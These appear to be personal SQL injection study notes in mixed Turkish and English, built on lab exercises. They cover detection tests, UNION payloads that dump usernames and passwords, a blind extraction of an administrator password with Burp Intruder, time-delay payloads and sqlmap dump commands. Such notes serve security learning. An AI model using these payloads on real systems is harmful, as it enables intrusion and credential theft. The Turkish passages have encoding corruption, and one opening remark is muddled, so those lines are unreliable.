


select * from users order by 4; -> 2.sÃ¼tuna gÃ¶re alfetik olarak sÄ±ralar, fakat 3 tane sÃ¼tun varsa hata verir, bizde bu ÅŸekilde 3 tane sÃ¼tun olduÄŸunu anlamÄ±ÅŸ oluruz.

select * username from users union select id, from emails; -> users tablosundaki username sÃ¼tunu ile emails tablosundaki id sÃ¼tununu birleÅŸtirir alt alta.

Type of SQL injection -> https://prnt.sc/AKC6QboDyY9A
1# In-Band (Classic)
	a -> Error
	b- > union
2# Inferential (Blind)
	a -> Boolean
	b -> Time
3# Out-of-Band



						1# Detection of vulnerability

Way #1:
	Birinci sorgu ve sonucu
		SELECT * FROM haberler WHERE id=1
		<html>
		MDISEC
		</html>
	Ä°kinci sorgu ve sonucu
		SELECT * FROM haberler WHERE id=2-1
		<html>
		MDISEC
		</html>

id kÄ±smÄ±na 1 yazdÄ±ÄŸÄ±nda gelen sonuÃ§ referans noktan 2 yazdÄ±ÄŸÄ±nda sonuÃ§ deÄŸiÅŸiyor ve 2-1 yaptÄ±ÄŸÄ±nda 1 ile aynÄ± sonuÃ§ geliyorsa demekki zafiyet var.

Way #2:

query #1 : SELECT * FROM haberler WHERE id=1'
response : 500 internal server error response code


query #2 : SELECT * FROM haberler WHERE id=1'--
response : 200 response code

-------------------------------------------------------------------------------------------------
						#2 Exploitation of weakness


##UNION SQLi

Goal -> Determine the number of the columns returned by the query.
	Background :
	table1		table2
	a | b		c | d
	-----		-----
	1  2		2  3
	3  4		4  5
	Query #1: select a,b from table 1
	1,2
	3,4
	Query #2: select a,b from table 1 UNION select c,d from table2
	1,2
	3,4
	2,3
	4,5
	Rule:
	- The number and the order of the columns must be the same in all queries
	- The data types must be compatible
	
	SQLi Attack (way #1):
	select ? from table1 UNION select NULL
	-error -> incorrect number of columns
	
	select ? from table1 UNION select NULL,NULL,NULL
	-200 response code -> correct number of columns
	
	' UNION SELECT NULL--
	' UNION SELECT NULL,NULL--
	' UNION SELECT NULL,NULL,NULL--
	etc.
	
	Sqli attack (way #2):
	select a,b from table1 order by 3
	-error -> incorrect number of columns, there are 2 columns that a and b.
	
	' ORDER BY 1--
	' ORDER BY 2--
	' ORDER BY 3--
	etc.


Goal -> Finding columns with a useful data type

	After you determine the number of columns, you can probe each column to test whether it can hold string data.
	
	' UNION SELECT 'a',NULL,NULL,NULL--
	' UNION SELECT NULL,'a',NULL,NULL--
	' UNION SELECT NULL,NULL,'a',NULL--
	' UNION SELECT NULL,NULL,NULL,'a'--
	
	If the column data type is not compatible with string data, the injected query will cause a databese error, such as:
	"Conversion failed when converting the varchar value 'a' to data type int."


Goal -> Using a SQL injection UNION attack to retrieve interesting data

	' UNION SELECT username, password FROM users--


Goal -> Retrieving multiple values within a single column

	1# find the number of columns that the vulnerable is using:
	
	' order by 1-- -> not displayed on the page
	' order by 2-- -> displayed on the page
	' order by 3-- -> internal server error
	
	2# Find which columns contain text
	
	' UNION SELECT 'a', NULL-- -> internal server error
	' UNION SELECT NULL, 'a'-- -> 200 code response
	
	3# Output data from other tables
	
	' UNION SELECT NULL, username FROM users--
	' UNION SELECT NULL, password FROM users--
	OR
	first learn the String Concatenation with version command:
	' UNION SELECT NULL,username || '~' || password FROM users--
	' UNION select NULL,username || password from users--



Goal -> Output the content of the table

	1# Find the number of columns
	' order by 2--
	
	2# Find the data type of the columns
	' UNION SELECT 'a', 'b'--
	
	3# Version of the database (To learn the database name)
	' UNION SELECT 'a', version()--  (for example : PostgreSQL 12.20)
	
	4# Output the list of the table names in the database
	SELECT * FROM information_schema.tables -> postgreSQL
	' UNION SELECT table_name,NULL FROM information_schema.tables
	users_aclxxp
	
	5# Output the list of the column names in the database
	SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' -> postgreSQL
	' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_aclxxp'-- 
	
	6# Output the username and passwords
	' UNION SELECT username, password FROM users--
	
	and login as a administrator.

||||||||||||||||||||||||||||||||||||||||||||
#Blind SQL injection

Goal -> Conditional responses
	1# Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. 
	For simplicity, let's say the original value of the cookie is TrackingId=xyz.
	2#Modify the TrackingId cookie, changing it to:
		TrackingId=xyz' AND '1'='1
		Verify that the Welcome back message appears in the response.
	3#Now change it to:
		TrackingId=xyz' AND '1'='2
		Verify that the Welcome back message does not appear in the response. 
		This demonstrates how you can test a single boolean condition and infer the result.
	4#Now change it to:
		TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
		Verify that the condition is true, confirming that there is a table called users.
	5#Now change it to:
		TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
		Verify that the condition is true, confirming that there is a user called administrator.
	6#The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:
		TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
		This condition should be true, confirming that the password is greater than 1 character in length.
	7#Send a series of follow-up values to test different password lengths. Send:
		TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
		Then send:
		TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
		And so on. You can do this manually using Burp Repeater, since the length is likely to be short. 
		When the condition stops being true (i.e. when the Welcome back message disappears), 
		you have determined the length of the password, which is in fact 20 characters long.
	8#After determining the length of the password, the next step is to test the character at each position to determine its value. 
	This involves a much larger number of requests, so you need to use Burp Intruder. 
	Send the request you are working on to Burp Intruder, using the context menu.
	9#In Burp Intruder, change the value of the cookie to:
		TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
		This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. 
		Our attack will cycle through each position and possible value, testing each one in turn.
	10#Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the Add Â§ button. 
	You should then see the following as the cookie value (note the payload position markers):
		TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='Â§aÂ§
	11#To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. 
	You can assume that the password contains only lowercase alphanumeric characters. In the Payloads side panel, check that Simple list is selected, and under Payload configuration add the payloads in the range a - z and 0 - 9. You can select these easily using the Add from list drop-down.
	12#To be able to tell when the correct character was submitted, you'll need to grep each response for the expression Welcome back. 
	To do this, click on the  Settings tab to open the Settings side panel. 
	In the Grep - Match section, clear existing entries in the list, then add the value Welcome back.
	13#Launch the attack by clicking the  Start attack button.

Goal -> Conditional Errors
	1# Prove that parameter is vulnerable
		' -> internal error
		'' -> 200 code response

Goal -> Exploiting blind SQL injection by triggering time delays
	' || pg_sleep(5)--
	'; IF (1=2) WAITFOR DELAY '0:0:10'--
	'; IF (1=1) WAITFOR DELAY '0:0:10'--
	Oracle	dbms_pipe.receive_message(('a'),10)
	Microsoft	WAITFOR DELAY '0:0:10'
	PostgreSQL	SELECT pg_sleep(10)
	MySQL	SELECT SLEEP(10)



ðŸ—²SqlMap
  #sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user  -> Testing on parameter names "user", we'll get confirmation
  #sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump  -> Dumping database
  #sqlmap.py -r /home/request.txt --dbs -> Login page username sqli detect.(https://infosecwriteups.com/sql-injection-for-beginners-using-sqlmap-36e091e8a070)
  #sqlmap.py -r /home/request.txt --dbs --level 5 -> parameter sql detect.(https://infosecwriteups.com/sql-injection-for-beginners-using-sqlmap-part-2-53e9775b67f5)



ðŸ—²Ghauri (https://github.com/r0oth3x49/ghauri)

ðŸ—²SqlFinder (https://github.com/americo/sqlifinder/tree/main)

ðŸ—²Blisqy (https://github.com/JohnTroony/Blisqy)


#(Knowing what database we are dealing with makes it easier to understand how to construct our malicious queries)
